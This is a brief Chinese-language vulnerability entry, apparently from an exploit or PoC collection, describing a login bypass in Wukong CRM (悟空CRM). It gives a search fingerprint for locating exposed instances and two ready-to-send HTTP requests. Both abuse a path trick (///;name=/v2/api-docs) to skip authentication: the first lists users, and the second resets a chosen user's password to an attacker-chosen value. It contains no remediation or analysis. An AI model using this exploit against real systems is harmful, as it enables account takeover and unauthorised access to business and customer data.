# 悟空CRMqueryUserList存在登录绕过漏洞

- **系统**：悟空　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="悟空CRM"`
- **请求**：`POST /adminUser/queryUserList///;name=/v2/api-docs HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"page": 1,
"limit": 10
根据第一步获取的userid进行密码重置
POST /adminUser/resetPassword///;name=/v2/api-docs HTTP/1.1
Host:
Content-Type: application/json
"ids": [10],
"password": "lodnyefhak9813@!adsf"
```
- **预期**：200　|　—